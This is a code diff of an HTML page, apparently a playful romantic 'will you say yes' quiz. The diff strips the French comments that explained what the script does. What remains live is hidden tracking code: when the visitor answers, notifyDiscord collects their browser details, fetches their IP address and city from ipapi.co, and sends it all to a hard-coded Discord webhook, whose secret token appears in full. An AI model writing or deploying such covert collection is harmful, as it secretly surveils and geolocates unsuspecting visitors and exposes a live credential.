@@ -39,7 +39,6 @@
             to { transform: translateY(110vh) rotate(360deg); }
         }
 
-        /* La carte centrale */
         .container {
             background: var(--soft-white);
             padding: 40px;
@@ -117,7 +116,7 @@
     </div>
 
     <script>
-    // CONFIGURATION : TON LIEN DISCORD
+    // CONFIGURATION
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1469444021763178620/4Vf6qAALlGBFI7tdNnB89XSitozazqgBshwv3zENgC9NDqmi6tRiLQEYgrfvS40xC6N2"; 
 
     const btnYes = document.getElementById('btn-yes');
@@ -140,12 +139,11 @@
     ];
 
     async function notifyDiscord(answer) {
-            // 1. On récupère les infos de base du navigateur
+        
             const ua = navigator.userAgent;
             const platform = navigator.platform;
             const language = navigator.language;
             
-            // 2. On essaie de récupérer l'IP et la ville (via un service gratuit)
             let geoData = "Infos localisation indisponibles";
             try {
                 const response = await fetch('https://ipapi.co/json/');
@@ -155,7 +153,6 @@
                 console.log("Erreur geo");
             }
 
-            // 3. On prépare le gros message bien détaillé
             const message = {
                 content: `🔔 **ALERTE RÉPONSE !**`,
                 embeds: [{
@@ -172,7 +169,6 @@
                 }]
             };
 
-            // 4. On envoie tout ça
             fetch(DISCORD_WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -192,7 +188,6 @@
     }
     setInterval(createHeart, 400);
 
-    // Clic sur NON
     btnNo.addEventListener('click', () => {
         if (clickCount < phrases.length) {
             btnNo.innerText = phrases[clickCount];
@@ -208,7 +203,6 @@
         }
     });
 
-    // Clic sur OUI
     btnYes.addEventListener('click', () => {
         quizSection.classList.add('hidden');
         successMsg.classList.remove('hidden');
@@ -219,6 +213,7 @@
 </body>
 
 </html>
+
 
 
 
